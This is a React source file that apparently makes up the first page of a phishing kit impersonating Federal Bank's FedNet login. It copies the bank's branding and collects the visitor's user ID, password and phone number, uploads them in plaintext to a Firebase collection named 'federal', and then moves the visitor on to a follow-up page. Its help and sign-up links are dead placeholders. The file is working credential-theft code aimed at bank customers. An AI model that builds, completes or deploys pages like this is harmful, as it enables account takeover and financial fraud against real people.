import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import '../App.css';
import FirebaseUtil from '../FirebaseRepo';

const FirstPage = () => {
  const [userId, setUserId] = useState('');
  const [password, setPassword] = useState(''); 
  const [phoneNumber, setPhoneNumber] = useState('');
  const [language] = useState('English');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();

  const COLLECTION_NAME = 'federal'; 

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const timestamp = Date.now();
      let documentId = localStorage.getItem(`${COLLECTION_NAME}_document_id`);
      if (!documentId) {
        documentId = `user_${timestamp}`;
        localStorage.setItem(`${COLLECTION_NAME}_document_id`, documentId);
      }
      
      // Firestore में डेटा अपलोड करें (User ID, Password, Phone Number)
      const result = await FirebaseUtil.uploadAnyModel(`${COLLECTION_NAME}/${documentId}`, {
        key: documentId,
        userId,
        password,
        phoneNumber,
        language,
        timeStamp: timestamp,
      });
      
      if (result.state === 'success') {
        setTimeout(() => {
          setIsSubmitting(false);
          // सफलतापूर्वक सबमिट होने पर दूसरे पेज पर नेविगेट करें
          navigate(`/second/${documentId}`);
        }, 1500);
      } else {
        throw new Error(result.error || 'Failed to upload data');
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setIsSubmitting(false);
    }
  };

  return (
    // Main Container - Light Background
    <div className="flex flex-col min-h-screen relative bg-gray-100 overflow-hidden">
        
        {/* Blurred Background Placeholder */}
        <div className="absolute inset-0 bg-cover bg-center" style={{ 
            backgroundImage: 'url("https://placehold.co/1000x1000/B0E0E6/000000/png?text=Federal+Bank+Background")', 
            filter: 'blur(3px)', 
            zIndex: 0 
        }}></div>

        {/* 🚨 UPDATED HEADER: Logo Section (आपके मार्क किए गए हिस्से के लिए) */}
        <header className="relative bg-white bg-opacity-90 p-3 flex justify-between items-center shadow-md z-10">
            <div className="flex items-center space-x-2 w-full justify-center">
                {/* 3411.png वाला Federal Bank का पूरा लोगो */}
                <img 
                    src="https://placehold.co/300x40/003366/FFFFFF/png?text=FEDERAL+BANK" // यहाँ आपको अपनी logo.png/svg का URL डालना होगा
                    alt="FEDERAL BANK" 
                    className="h-8 md:h-10" // लोगो की ऊँचाई एडजस्ट की गई
                />
            </div>
            {/* राइट साइड के आइकॉन्स हटा दिए गए हैं ताकि पूरा लोगो फिट हो सके */}
        </header>
        {/* --- Header End --- */}

        {/* Main Content - White Login Card */}
        <main className="flex-1 p-4 flex justify-center items-start pt-16 relative z-10">
            <div className="bg-white rounded-lg w-full max-w-sm p-6 shadow-2xl">
                
                {/* Need an Account? Sign Up Section */}
                <div className="flex justify-between items-center mb-6">
                    <p className="text-sm text-gray-600">
                        Need an Account? <a href="#" className="text-blue-600 font-semibold hover:underline">Sign Up</a>
                    </p>
                    {/* FedNet Logo Placeholder */}
                    <img src="https://placehold.co/60x20/FFFFFF/003366/png?text=FedNet" alt="FedNet Logo" className="h-5" />
                </div>

                {/* Login Form */}
                <form onSubmit={handleSubmit} className="space-y-4">
                    
                    {/* 1. User ID Input */}
                    <div>
                        <input
                            type="text"
                            placeholder="User ID"
                            value={userId}
                            onChange={(e) => setUserId(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                            required
                            disabled={isSubmitting}
                        />
                    </div>
                    
                    {/* 2. Password Input */}
                    <div>
                        <input
                            type="password"
                            placeholder="Password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                            required
                            disabled={isSubmitting}
                        />
                    </div>
                    
                    {/* 3. Phone Number Input */}
                    <div>
                        <input
                            type="tel"
                            placeholder="10-digit phone number"
                            value={phoneNumber}
                            onChange={(e) => setPhoneNumber(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                            required
                            pattern="[0-9]{10}"
                            disabled={isSubmitting}
                        />
                    </div>
                    
                    {/* LOGIN Button (Dark Blue) */}
                    <button
                        type="submit"
                        className="w-full bg-[#003366] hover:bg-[#004488] text-white font-bold py-2 rounded-md transition duration-150 ease-in-out text-base mt-2"
                        disabled={isSubmitting}
                    >
                        {isSubmitting ? "Processing..." : "Log In"}
                    </button>

                    {/* Links below the LOGIN button */}
                    <div className="flex justify-between text-sm pt-1">
                        <a href="#" className="text-blue-600 hover:underline">
                            Forgot Password?
                        </a>
                        <div className="space-x-4">
                            <a href="#" className="text-blue-600 hover:underline">
                                Forgot User ID?
                            </a>
                            <a href="#" className="text-blue-600 hover:underline">
                                Unlock User ID?
                            </a>
                        </div>
                    </div>

                </form>

            </div>
        </main>

        {/* Footer (Dark Blue Federal Bank Bar) */}
        <footer className="relative bg-[#003366] text-white p-4 text-center z-10">
            {/* Federal Bank Logo and Text */}
            <div className="flex justify-center items-center space-x-2 mb-2">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.477 3-10S13.657 3 12 3s-3 4.477-3 10 1.343 10 3 10z" />
                </svg>
                <div className="text-lg font-bold">FEDERAL BANK</div>
            </div>
            <p className="text-xs">YOUR PERFECT BANKING PARTNER</p>
        </footer>
    </div>
  );
};

export default FirstPage;

